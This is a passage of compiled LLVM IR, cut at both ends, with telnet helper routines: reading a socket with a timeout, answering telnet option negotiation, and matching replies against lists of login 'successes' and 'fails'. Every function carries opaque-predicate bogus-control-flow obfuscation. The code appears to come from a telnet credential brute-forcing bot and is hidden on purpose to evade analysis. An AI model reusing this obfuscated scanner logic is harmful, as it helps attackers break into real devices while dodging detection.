  %45 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %39, i8* %44)
  %46 = icmp ne i32 %45, 0
  br i1 %46, label %47, label %48

; <label>:47:                                     ; preds = %38
  store i32 1, i32* %3, align 4
  br label %85

; <label>:48:                                     ; preds = %38
  br label %49

; <label>:49:                                     ; preds = %48
  %50 = load i32, i32* @x.9
  %51 = load i32, i32* @y.10
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBB13, label %originalBB13alteredBB

originalBB13:                                     ; preds = %originalBB13alteredBB, %49
  %58 = load i32, i32* %7, align 4
  %59 = add nsw i32 %58, 1
  store i32 %59, i32* %7, align 4
  %60 = load i32, i32* @x.9
  %61 = load i32, i32* @y.10
  %62 = sub i32 %60, 1
  %63 = mul i32 %60, %62
  %64 = urem i32 %63, 2
  %65 = icmp eq i32 %64, 0
  %66 = icmp slt i32 %61, 10
  %67 = or i1 %65, %66
  br i1 %67, label %originalBBpart218, label %originalBB13alteredBB

originalBBpart218:                                ; preds = %originalBB13
  br label %34

; <label>:68:                                     ; preds = %34
  %69 = load i32, i32* @x.9
  %70 = load i32, i32* @y.10
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBB20, label %originalBB20alteredBB

originalBB20:                                     ; preds = %originalBB20alteredBB, %68
  store i32 0, i32* %3, align 4
  %77 = load i32, i32* @x.9
  %78 = load i32, i32* @y.10
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBBpart222, label %originalBB20alteredBB

originalBBpart222:                                ; preds = %originalBB20
  br label %85

; <label>:85:                                     ; preds = %originalBBpart222, %47
  %86 = load i32, i32* %3, align 4
  ret i32 %86

originalBBalteredBB:                              ; preds = %originalBB, %8
  %87 = load i8**, i8*** %5, align 8
  %88 = load i32, i32* %6, align 4
  %_ = sub i32 %88, 1
  %gen = mul i32 %_, 1
  %_1 = sub i32 0, %88
  %gen2 = add i32 %_1, 1
  %_3 = shl i32 %88, 1
  %_4 = sub i32 0, %88
  %gen5 = add i32 %_4, 1
  %_6 = sub i32 0, %88
  %gen7 = add i32 %_6, 1
  %_8 = sub i32 0, %88
  %gen9 = add i32 %_8, 1
  %_10 = sub i32 0, %88
  %gen11 = add i32 %_10, 1
  %_12 = shl i32 %88, 1
  %89 = add nsw i32 %88, 1
  store i32 %89, i32* %6, align 4
  %90 = sext i32 %89 to i64
  %91 = getelementptr inbounds i8*, i8** %87, i64 %90
  %92 = load i8*, i8** %91, align 8
  %93 = icmp ne i8* %92, null
  br label %originalBB

originalBB13alteredBB:                            ; preds = %originalBB13, %49
  %94 = load i32, i32* %7, align 4
  %_14 = sub i32 0, %94
  %gen15 = add i32 %_14, 1
  %_16 = shl i32 %94, 1
  %95 = add nsw i32 %94, 1
  store i32 %95, i32* %7, align 4
  br label %originalBB13

originalBB20alteredBB:                            ; preds = %originalBB20, %68
  store i32 0, i32* %3, align 4
  br label %originalBB20
}

declare i32 @strcasestr(...) #2

; Function Attrs: noinline nounwind uwtable
define i32 @contains_success(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([6 x i8*], [6 x i8*]* @successes, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_fail(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([8 x i8*], [8 x i8*]* @fails, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_response(i8*) #0 {
  %2 = load i32, i32* @x.15
  %3 = load i32, i32* @y.16
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i8*, align 8
  store i8* %0, i8** %10, align 8
  %11 = load i8*, i8** %10, align 8
  %12 = call i32 @contains_success(i8* %11)
  %13 = icmp ne i32 %12, 0
  %14 = load i32, i32* @x.15
  %15 = load i32, i32* @y.16
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %13, label %42, label %22

; <label>:22:                                     ; preds = %originalBBpart2
  %23 = load i32, i32* @x.15
  %24 = load i32, i32* @y.16
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %22
  %31 = load i8*, i8** %10, align 8
  %32 = call i32 @contains_fail(i8* %31)
  %33 = icmp ne i32 %32, 0
  %34 = load i32, i32* @x.15
  %35 = load i32, i32* @y.16
  %36 = sub i32 %34, 1
  %37 = mul i32 %34, %36
  %38 = urem i32 %37, 2
  %39 = icmp eq i32 %38, 0
  %40 = icmp slt i32 %35, 10
  %41 = or i1 %39, %40
  br i1 %41, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %42

; <label>:42:                                     ; preds = %originalBBpart24, %originalBBpart2
  %43 = phi i1 [ true, %originalBBpart2 ], [ %33, %originalBBpart24 ]
  %44 = load i32, i32* @x.15
  %45 = load i32, i32* @y.16
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %42
  %52 = zext i1 %43 to i32
  %53 = load i32, i32* @x.15
  %54 = load i32, i32* @y.16
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  ret i32 %52

originalBBalteredBB:                              ; preds = %originalBB, %1
  %61 = alloca i8*, align 8
  store i8* %0, i8** %61, align 8
  %62 = load i8*, i8** %61, align 8
  %63 = call i32 @contains_success(i8* %62)
  %64 = icmp ne i32 %63, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %22
  %65 = load i8*, i8** %10, align 8
  %66 = call i32 @contains_fail(i8* %65)
  %67 = icmp ne i32 %66, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %42
  %68 = zext i1 %43 to i32
  br label %originalBB6
}

; Function Attrs: noinline nounwind uwtable
define i32 @read_with_timeout(i32, i32, i8*, i32) #0 {
  %5 = load i32, i32* @x.17
  %6 = load i32, i32* @y.18
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca %struct.fd_set, align 8
  %19 = alloca %struct.timeval, align 8
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i32 %0, i32* %14, align 4
  store i32 %1, i32* %15, align 4
  store i8* %2, i8** %16, align 8
  store i32 %3, i32* %17, align 4
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %19, i32 0, i32 0
  store i64 0, i64* %22, align 8
  %23 = load i32, i32* %15, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds %struct.timeval, %struct.timeval* %19, i32 0, i32 1
  store i64 %24, i64* %25, align 8
  %26 = load i32, i32* @x.17
  %27 = load i32, i32* @y.18
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %34

; <label>:34:                                     ; preds = %originalBBpart2
  %35 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %18, i32 0, i32 0
  %36 = getelementptr inbounds [16 x i64], [16 x i64]* %35, i64 0, i64 0
  %37 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %36) #5, !srcloc !1
  %38 = extractvalue { i64, i64* } %37, 0
  %39 = extractvalue { i64, i64* } %37, 1
  %40 = trunc i64 %38 to i32
  store i32 %40, i32* %20, align 4
  %41 = ptrtoint i64* %39 to i64
  %42 = trunc i64 %41 to i32
  store i32 %42, i32* %21, align 4
  br label %43

; <label>:43:                                     ; preds = %34
  %44 = load i32, i32* %14, align 4
  %45 = srem i32 %44, 64
  %46 = zext i32 %45 to i64
  %47 = shl i64 1, %46
  %48 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %18, i32 0, i32 0
  %49 = load i32, i32* %14, align 4
  %50 = sdiv i32 %49, 64
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds [16 x i64], [16 x i64]* %48, i64 0, i64 %51
  %53 = load i64, i64* %52, align 8
  %54 = or i64 %53, %47
  store i64 %54, i64* %52, align 8
  %55 = load i32, i32* %14, align 4
  %56 = add nsw i32 %55, 1
  %57 = call i32 @select(i32 %56, %struct.fd_set* %18, %struct.fd_set* null, %struct.fd_set* null, %struct.timeval* %19)
  %58 = icmp slt i32 %57, 1
  br i1 %58, label %59, label %76

; <label>:59:                                     ; preds = %43
  %60 = load i32, i32* @x.17
  %61 = load i32, i32* @y.18
  %62 = sub i32 %60, 1
  %63 = mul i32 %60, %62
  %64 = urem i32 %63, 2
  %65 = icmp eq i32 %64, 0
  %66 = icmp slt i32 %61, 10
  %67 = or i1 %65, %66
  br i1 %67, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %59
  store i32 0, i32* %13, align 4
  %68 = load i32, i32* @x.17
  %69 = load i32, i32* @y.18
  %70 = sub i32 %68, 1
  %71 = mul i32 %68, %70
  %72 = urem i32 %71, 2
  %73 = icmp eq i32 %72, 0
  %74 = icmp slt i32 %69, 10
  %75 = or i1 %73, %74
  br i1 %75, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %83

; <label>:76:                                     ; preds = %43
  %77 = load i32, i32* %14, align 4
  %78 = load i8*, i8** %16, align 8
  %79 = load i32, i32* %17, align 4
  %80 = sext i32 %79 to i64
  %81 = call i64 @recv(i32 %77, i8* %78, i64 %80, i32 0)
  %82 = trunc i64 %81 to i32
  store i32 %82, i32* %13, align 4
  br label %83

; <label>:83:                                     ; preds = %76, %originalBBpart24
  %84 = load i32, i32* %13, align 4
  ret i32 %84

originalBBalteredBB:                              ; preds = %originalBB, %4
  %85 = alloca i32, align 4
  %86 = alloca i32, align 4
  %87 = alloca i32, align 4
  %88 = alloca i8*, align 8
  %89 = alloca i32, align 4
  %90 = alloca %struct.fd_set, align 8
  %91 = alloca %struct.timeval, align 8
  %92 = alloca i32, align 4
  %93 = alloca i32, align 4
  store i32 %0, i32* %86, align 4
  store i32 %1, i32* %87, align 4
  store i8* %2, i8** %88, align 8
  store i32 %3, i32* %89, align 4
  %94 = getelementptr inbounds %struct.timeval, %struct.timeval* %91, i32 0, i32 0
  store i64 0, i64* %94, align 8
  %95 = load i32, i32* %87, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds %struct.timeval, %struct.timeval* %91, i32 0, i32 1
  store i64 %96, i64* %97, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %59
  store i32 0, i32* %13, align 4
  br label %originalBB1
}

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #2

declare i64 @recv(i32, i8*, i64, i32) #2

; Function Attrs: noinline nounwind uwtable
define i32 @read_until_response(i32, i32, i8*, i32, i8**) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i32 %1, i32* %8, align 4
  store i8* %2, i8** %9, align 8
  store i32 %3, i32* %10, align 4
  store i8** %4, i8*** %11, align 8
  %14 = load i8*, i8** %9, align 8
  %15 = load i32, i32* %10, align 4
  %16 = sext i32 %15 to i64
  call void @llvm.memset.p0i8.i64(i8* %14, i8 0, i64 %16, i32 1, i1 false)
  %17 = load i32, i32* %7, align 4
  %18 = load i32, i32* %8, align 4
  %19 = load i8*, i8** %9, align 8
  %20 = load i32, i32* %10, align 4
  %21 = call i32 @read_with_timeout(i32 %17, i32 %18, i8* %19, i32 %20)
  store i32 %21, i32* %12, align 4
  %22 = load i8*, i8** %9, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 0
  %24 = load i8, i8* %23, align 1
  %25 = sext i8 %24 to i32
  %26 = icmp eq i32 %25, 255
  br i1 %26, label %27, label %31

; <label>:27:                                     ; preds = %5
  %28 = load i32, i32* %7, align 4
  %29 = load i8*, i8** %9, align 8
  %30 = call i32 @negotiate(i32 %28, i8* %29, i32 3)
  br label %31

; <label>:31:                                     ; preds = %27, %5
  %32 = load i32, i32* @x.19
  %33 = load i32, i32* @y.20
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %31
  %40 = load i8*, i8** %9, align 8
  %41 = load i8**, i8*** %11, align 8
  %42 = call i32 @contains_string(i8* %40, i8** %41)
  %43 = icmp ne i32 %42, 0
  %44 = load i32, i32* @x.19
  %45 = load i32, i32* @y.20
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %43, label %52, label %69

; <label>:52:                                     ; preds = %originalBBpart2
  %53 = load i32, i32* @x.19
  %54 = load i32, i32* @y.20
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %52
  store i32 1, i32* %6, align 4
  %61 = load i32, i32* @x.19
  %62 = load i32, i32* @y.20
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %86

; <label>:69:                                     ; preds = %originalBBpart2
  %70 = load i32, i32* @x.19
  %71 = load i32, i32* @y.20
  %72 = sub i32 %70, 1
  %73 = mul i32 %70, %72
  %74 = urem i32 %73, 2
  %75 = icmp eq i32 %74, 0
  %76 = icmp slt i32 %71, 10
  %77 = or i1 %75, %76
  br i1 %77, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %69
  store i32 0, i32* %6, align 4
  %78 = load i32, i32* @x.19
  %79 = load i32, i32* @y.20
  %80 = sub i32 %78, 1
  %81 = mul i32 %78, %80
  %82 = urem i32 %81, 2
  %83 = icmp eq i32 %82, 0
  %84 = icmp slt i32 %79, 10
  %85 = or i1 %83, %84
  br i1 %85, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %86

; <label>:86:                                     ; preds = %originalBBpart28, %originalBBpart24
  %87 = load i32, i32* %6, align 4
  ret i32 %87

originalBBalteredBB:                              ; preds = %originalBB, %31
  %88 = load i8*, i8** %9, align 8
  %89 = load i8**, i8*** %11, align 8
  %90 = call i32 @contains_string(i8* %88, i8** %89)
  %91 = icmp ne i32 %90, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %52
  store i32 1, i32* %6, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %69
  store i32 0, i32* %6, align 4
  br label %originalBB6
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #3

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) #0 {
  %4 = load i32, i32* @x.21
  %5 = load i32, i32* @y.22
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  store i32 %0, i32* %13, align 4
  store i8* %1, i8** %14, align 8
  store i32 %2, i32* %15, align 4
  %17 = load i8*, i8** %14, align 8
  %18 = getelementptr inbounds i8, i8* %17, i64 1
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = load i32, i32* @x.21
  %22 = load i32, i32* @y.22
  %23 = sub i32 %21, 1
  %24 = mul i32 %21, %23
  %25 = urem i32 %24, 2
  %26 = icmp eq i32 %25, 0
  %27 = icmp slt i32 %22, 10
  %28 = or i1 %26, %27
  br i1 %28, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  switch i32 %20, label %205 [
    i32 255, label %29
    i32 251, label %30
    i32 252, label %30
    i32 253, label %30
    i32 254, label %30
  ]

; <label>:29:                                     ; preds = %originalBBpart2
  store i32 0, i32* %12, align 4
  br label %207

; <label>:30:                                     ; preds = %originalBBpart2, %originalBBpart2, %originalBBpart2, %originalBBpart2
  %31 = load i32, i32* @x.21
  %32 = load i32, i32* @y.22
  %33 = sub i32 %31, 1
  %34 = mul i32 %31, %33
  %35 = urem i32 %34, 2
  %36 = icmp eq i32 %35, 0
  %37 = icmp slt i32 %32, 10
  %38 = or i1 %36, %37
  br i1 %38, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %30
  store i8 -1, i8* %16, align 1
  %39 = load i32, i32* %13, align 4
  %40 = call i64 @send(i32 %39, i8* %16, i64 1, i32 16384)
  %41 = load i8*, i8** %14, align 8
  %42 = getelementptr inbounds i8, i8* %41, i64 1
  %43 = load i8, i8* %42, align 1
  %44 = zext i8 %43 to i32
  %45 = icmp eq i32 252, %44
  %46 = load i32, i32* @x.21
  %47 = load i32, i32* @y.22
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %45, label %54, label %71

; <label>:54:                                     ; preds = %originalBBpart24
  %55 = load i32, i32* @x.21
  %56 = load i32, i32* @y.22
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %54
  store i8 -2, i8* %16, align 1
  %63 = load i32, i32* @x.21
  %64 = load i32, i32* @y.22
  %65 = sub i32 %63, 1
  %66 = mul i32 %63, %65
  %67 = urem i32 %66, 2
  %68 = icmp eq i32 %67, 0
  %69 = icmp slt i32 %64, 10
  %70 = or i1 %68, %69
  br i1 %70, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %198

; <label>:71:                                     ; preds = %originalBBpart24
  %72 = load i32, i32* @x.21
  %73 = load i32, i32* @y.22
  %74 = sub i32 %72, 1
  %75 = mul i32 %72, %74
  %76 = urem i32 %75, 2
  %77 = icmp eq i32 %76, 0
  %78 = icmp slt i32 %73, 10
  %79 = or i1 %77, %78
  br i1 %79, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %71
  %80 = load i8*, i8** %14, align 8
  %81 = getelementptr inbounds i8, i8* %80, i64 1
  %82 = load i8, i8* %81, align 1
  %83 = zext i8 %82 to i32
  %84 = icmp eq i32 254, %83
  %85 = load i32, i32* @x.21
  %86 = load i32, i32* @y.22
  %87 = sub i32 %85, 1
  %88 = mul i32 %85, %87
  %89 = urem i32 %88, 2
  %90 = icmp eq i32 %89, 0
  %91 = icmp slt i32 %86, 10
  %92 = or i1 %90, %91
  br i1 %92, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %84, label %93, label %94

; <label>:93:                                     ; preds = %originalBBpart212
  store i8 -4, i8* %16, align 1
  br label %181

; <label>:94:                                     ; preds = %originalBBpart212
  %95 = load i32, i32* @x.21
  %96 = load i32, i32* @y.22
  %97 = sub i32 %95, 1
  %98 = mul i32 %95, %97
  %99 = urem i32 %98, 2
  %100 = icmp eq i32 %99, 0
  %101 = icmp slt i32 %96, 10
  %102 = or i1 %100, %101
  br i1 %102, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %94
  %103 = load i8*, i8** %14, align 8
  %104 = getelementptr inbounds i8, i8* %103, i64 1
  %105 = load i8, i8* %104, align 1
  %106 = zext i8 %105 to i32
  %107 = icmp eq i32 3, %106
  %108 = load i32, i32* @x.21
  %109 = load i32, i32* @y.22
  %110 = sub i32 %108, 1
  %111 = mul i32 %108, %110
  %112 = urem i32 %111, 2
  %113 = icmp eq i32 %112, 0
  %114 = icmp slt i32 %109, 10
  %115 = or i1 %113, %114
  br i1 %115, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %107, label %116, label %140

; <label>:116:                                    ; preds = %originalBBpart216
  %117 = load i32, i32* @x.21
  %118 = load i32, i32* @y.22
  %119 = sub i32 %117, 1
  %120 = mul i32 %117, %119
  %121 = urem i32 %120, 2
  %122 = icmp eq i32 %121, 0
  %123 = icmp slt i32 %118, 10
  %124 = or i1 %122, %123
  br i1 %124, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %116
  %125 = load i8*, i8** %14, align 8
  %126 = getelementptr inbounds i8, i8* %125, i64 1
  %127 = load i8, i8* %126, align 1
  %128 = zext i8 %127 to i32
  %129 = icmp eq i32 %128, 253
  %130 = select i1 %129, i32 251, i32 253
  %131 = trunc i32 %130 to i8
  store i8 %131, i8* %16, align 1
  %132 = load i32, i32* @x.21
  %133 = load i32, i32* @y.22
  %134 = sub i32 %132, 1
  %135 = mul i32 %132, %134
  %136 = urem i32 %135, 2
  %137 = icmp eq i32 %136, 0
  %138 = icmp slt i32 %133, 10
  %139 = or i1 %137, %138
  br i1 %139, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %164

; <label>:140:                                    ; preds = %originalBBpart216
  %141 = load i32, i32* @x.21
  %142 = load i32, i32* @y.22
  %143 = sub i32 %141, 1
  %144 = mul i32 %141, %143
  %145 = urem i32 %144, 2
  %146 = icmp eq i32 %145, 0
  %147 = icmp slt i32 %142, 10
  %148 = or i1 %146, %147
  br i1 %148, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %140
  %149 = load i8*, i8** %14, align 8
  %150 = getelementptr inbounds i8, i8* %149, i64 1
  %151 = load i8, i8* %150, align 1
  %152 = zext i8 %151 to i32
  %153 = icmp eq i32 %152, 253
  %154 = select i1 %153, i32 252, i32 254
  %155 = trunc i32 %154 to i8
  store i8 %155, i8* %16, align 1
  %156 = load i32, i32* @x.21
  %157 = load i32, i32* @y.22
  %158 = sub i32 %156, 1
  %159 = mul i32 %156, %158
  %160 = urem i32 %159, 2
  %161 = icmp eq i32 %160, 0
  %162 = icmp slt i32 %157, 10
  %163 = or i1 %161, %162
  br i1 %163, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %164

; <label>:164:                                    ; preds = %originalBBpart224, %originalBBpart220
  %165 = load i32, i32* @x.21
  %166 = load i32, i32* @y.22
  %167 = sub i32 %165, 1
  %168 = mul i32 %165, %167
  %169 = urem i32 %168, 2
  %170 = icmp eq i32 %169, 0
  %171 = icmp slt i32 %166, 10
  %172 = or i1 %170, %171
  br i1 %172, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %164
  %173 = load i32, i32* @x.21
  %174 = load i32, i32* @y.22
  %175 = sub i32 %173, 1
  %176 = mul i32 %173, %175
  %177 = urem i32 %176, 2
  %178 = icmp eq i32 %177, 0
  %179 = icmp slt i32 %174, 10
  %180 = or i1 %178, %179
  br i1 %180, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %181

; <label>:181:                                    ; preds = %originalBBpart228, %93
  %182 = load i32, i32* @x.21
  %183 = load i32, i32* @y.22
  %184 = sub i32 %182, 1
  %185 = mul i32 %182, %184
  %186 = urem i32 %185, 2
  %187 = icmp eq i32 %186, 0
  %188 = icmp slt i32 %183, 10
  %189 = or i1 %187, %188
  br i1 %189, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %181
  %190 = load i32, i32* @x.21
  %191 = load i32, i32* @y.22
  %192 = sub i32 %190, 1
  %193 = mul i32 %190, %192
  %194 = urem i32 %193, 2
  %195 = icmp eq i32 %194, 0
  %196 = icmp slt i32 %191, 10
  %197 = or i1 %195, %196
  br i1 %197, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br label %198

; <label>:198:                                    ; preds = %originalBBpart232, %originalBBpart28
  %199 = load i32, i32* %13, align 4
  %200 = call i64 @send(i32 %199, i8* %16, i64 1, i32 16384)
  %201 = load i32, i32* %13, align 4
  %202 = load i8*, i8** %14, align 8
  %203 = getelementptr inbounds i8, i8* %202, i64 2
  %204 = call i64 @send(i32 %201, i8* %203, i64 1, i32 16384)
  br label %206

; <label>:205:                                    ; preds = %originalBBpart2
  br label %206

; <label>:206:                                    ; preds = %205, %198
  store i32 0, i32* %12, align 4
  br label %207

; <label>:207:                                    ; preds = %206, %29
  %208 = load i32, i32* %12, align 4
  ret i32 %208

originalBBalteredBB:                              ; preds = %originalBB, %3
  %209 = alloca i32, align 4
  %210 = alloca i32, align 4
  %211 = alloca i8*, align 8
  %212 = alloca i32, align 4
  %213 = alloca i8, align 1
  store i32 %0, i32* %210, align 4
  store i8* %1, i8** %211, align 8
  store i32 %2, i32* %212, align 4
  %214 = load i8*, i8** %211, align 8
  %215 = getelementptr inbounds i8, i8* %214, i64 1
  %216 = load i8, i8* %215, align 1
  %217 = zext i8 %216 to i32
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %30
  store i8 -1, i8* %16, align 1
  %218 = load i32, i32* %13, align 4
  %219 = call i64 @send(i32 %218, i8* %16, i64 1, i32 16384)
  %220 = load i8*, i8** %14, align 8
  %221 = getelementptr inbounds i8, i8* %220, i64 1
  %222 = load i8, i8* %221, align 1
  %223 = zext i8 %222 to i32
  %224 = icmp eq i32 252, %223
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %54
  store i8 -2, i8* %16, align 1
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %71
  %225 = load i8*, i8** %14, align 8
  %226 = getelementptr inbounds i8, i8* %225, i64 1
  %227 = load i8, i8* %226, align 1
  %228 = zext i8 %227 to i32
  %229 = icmp eq i32 254, %228
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %94
  %230 = load i8*, i8** %14, align 8
